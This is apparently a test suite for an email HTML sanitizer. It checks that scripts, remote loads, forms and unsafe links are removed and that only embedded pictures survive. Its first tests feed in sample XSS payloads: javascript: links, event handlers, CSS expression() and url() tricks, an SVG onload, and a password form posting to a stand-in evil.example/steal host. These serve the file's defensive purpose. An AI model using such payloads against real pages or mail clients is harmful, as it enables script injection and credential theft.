import { test } from "node:test";
import assert from "node:assert/strict";
import { cleanCss, cleanMailHtml, MAIL_CSP, mailDocument, mailHref, pictureData, pictureType, withImages } from "../src/mail-html.js";
import { cidParts } from "../src/imports/icloud.js";
import { previewOf } from "../src/mail-inbox.js";

const PNG = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13]);

test("mail html: nothing that runs, loads or submits survives", () => {
  const evil = `<html><head><meta http-equiv="refresh" content="0;url=https://evil.example/"><base href="https://evil.example/">
    <link rel="stylesheet" href="https://evil.example/x.css"><script>alert(1)</script></head>
    <body onload="alert(2)" bgcolor="#eee">
    <p onclick="alert(3)" style="color:red">Hello <b>there</b></p>
    <a href="javascript:alert(4)">bad</a> <a href="data:text/html,<script>alert(5)</script>">bad2</a>
    <a href="https://shop.example/a?x=1&amp;y=2" target="_top">good</a> <a href="mailto:help@shop.example">mail</a>
    <iframe src="https://evil.example/"></iframe><object data="x.swf"></object><embed src="x">
    <form action="https://evil.example/steal"><input name="password"><button>Go</button></form>
    <svg><script>alert(6)</script><a href="javascript:alert(7)">s</a></svg>
    <img src="x" onerror="alert(8)"><img src="javascript:alert(9)">
    <noscript><img src="https://evil.example/ns.gif"></noscript>
    <style>@import url(https://evil.example/i.css); .a { background: url(https://evil.example/bg.png) } .b { width: expression(alert(10)) }</style>
    <div style="background-image:url('https://evil.example/t.gif');behavior:url(x.htc)">x</div>
    <p>&lt;script&gt;alert(11)&lt;/script&gt;</p>
    </body></html>`;
  const { html, remote } = cleanMailHtml(evil);
  for (const bad of [/<script/i, /\son\w+=/i, /javascript:/i, /data:text/i, /<iframe/i, /<object/i, /<embed/i, /<form/i, /<input/i, /<button/i, /<svg/i, /<meta/i, /<base/i, /<link/i, /@import/i, /evil\.example/, /expression\(/i, /behavior/i, /target=/i]) {
    assert.doesNotMatch(html, bad, String(bad));
  }
  assert.match(html, /<p style="color:red">Hello <b>there<\/b><\/p>/);
  assert.match(html, /<a href="https:\/\/shop\.example\/a\?x=1&amp;y=2">good<\/a>/);
  assert.match(html, /<a href="mailto:help@shop\.example">mail<\/a>/);
  assert.match(html, /class="aeneas-mail" bgcolor="#eee"/, "the body's colour is kept on the wrapper");
  assert.match(html, /&lt;script&gt;alert\(11\)/, "text that looks like markup stays text");
  assert.deepEqual(remote, [], "an <img src=x> and a javascript: picture are not fetched");
});

test("mail html: CSS loads nothing but pictures written into the mail", () => {
  assert.equal(cleanCss("a{background:url(https://t.example/p.gif)}"), "a{background:none}");
  assert.doesNotMatch(cleanCss("a{background:u\\72l(https://t.example/p.gif)}"), /url\(/, "a CSS escape cannot spell url");
  assert.equal(cleanCss(`a{background:image-set("https://t.example/p.gif" 1x)}`), `a{background:none("https://t.example/p.gif" 1x)}`);
  assert.equal(cleanCss("a{background:url( 'data:image/png;base64,AAAA' )}"), 'a{background:url("data:image/png;base64,AAAA")}');
  assert.equal(cleanCss("a{background:url(data:image/svg+xml;base64,AAAA)}"), "a{background:none}", "never an SVG");
  assert.equal(cleanCss("@font-face{font-family:x;src:url(https://f.example/x.woff)} p{color:red}"), " p{color:red}");
  assert.doesNotMatch(cleanCss("</style><script>alert(1)</script>"), /[<>]/);
});

test("mail html: pictures inside the mail are written in; web pictures are numbered for the hub to fetch, never loaded", () => {
  const data = pictureData(PNG)!;
  const { html, remote } = cleanMailHtml(`<img src="cid:logo@x" alt="Logo" width="120"><img src="https://img.example/a.png"><img src="//img.example/b.png" srcset="https://img.example/c.png 2x"><img src="https://img.example/a.png"><img src="cid:missing@x">`, new Map([["logo@x", data]]));
  assert.deepEqual(remote, ["https://img.example/a.png", "https://img.example/b.png"], "each address once; srcset never");
  assert.ok(html.includes(`<img src="${data}" width="120" alt="Logo">`));
  assert.doesNotMatch(html, /img\.example/, "no web address is in the page");
  assert.equal((html.match(/<img data-r="0"/g) ?? []).length, 2);
  const shown = withImages(html, [pictureData(PNG), null]);
  assert.doesNotMatch(shown, /data-r=/);
  assert.equal((shown.match(/data:image\/png/g) ?? []).length, 3);
  assert.equal(withImages(html, ["data:text/html;base64,PHNjcmlwdD4="]).includes("data:text/html"), false, "only a picture is written in");
});

test("mail html: a picture is told by its bytes, never by what its server calls it, and never SVG", () => {
  assert.equal(pictureType(PNG), "image/png");
  assert.equal(pictureType(Buffer.from([0xff, 0xd8, 0xff, 0xe0])), "image/jpeg");
  assert.equal(pictureType(Buffer.from("GIF89a....")), "image/gif");
  assert.equal(pictureType(Buffer.from("<svg onload=alert(1)>")), null);
  assert.equal(pictureType(Buffer.from("<html>")), null);
  assert.equal(pictureData(Buffer.from("<html>")), null);
});

test("mail html: the page's own policy loads nothing from anywhere; links are http(s) or mailto only", () => {
  const page = mailDocument("<p>Hi</p>");
  assert.ok(page.includes(`content="${MAIL_CSP}"`));
  assert.match(MAIL_CSP, /default-src 'none'/);
  assert.match(MAIL_CSP, /img-src data:;/);
  assert.match(MAIL_CSP, /script-src 'none'/);
  assert.equal(mailHref("javascript:alert(1)"), null);
  assert.equal(mailHref("file:///c:/x"), null);
  assert.equal(mailHref("https://user:pw@bank.example/"), null);
  assert.equal(mailHref("https://shop.example/x"), "https://shop.example/x");
});

test("mail html: only pictures the HTML shows are fetched from the message, never attachments", () => {
  const tree = { type: "multipart/related", childNodes: [
    { part: "1", type: "text/html" },
    { part: "2", type: "image/png", id: "<logo@x>", size: 1000 },
    { part: "3", type: "image/png", id: "<unused@x>", size: 1000 },
    { part: "4", type: "application/pdf", id: "<doc@x>", size: 1000 },
    { part: "5", type: "image/jpeg", id: "<huge@x>", size: 50_000_000 },
  ] };
  assert.deepEqual(cidParts(tree, `<img src="cid:logo@x"><img src="cid:doc@x"><img src="cid:huge@x">`), [{ part: "2", cid: "logo@x" }]);
});

test("mail html: the list's first line shows link words, never addresses", () => {
  assert.equal(previewOf("[Coffee](https://www.drinktrade.example/all)\t[Trade](https://account.drinktrade.example?view=my_trade) Meet your next match"), "Coffee Trade Meet your next match");
  assert.equal(previewOf("Track it here (https://ship.example/t/1). Thanks"), "Track it here. Thanks");
  assert.equal(previewOf("Visit https://a.example/x or <https://b.example/y> now"), "Visit or now");
});
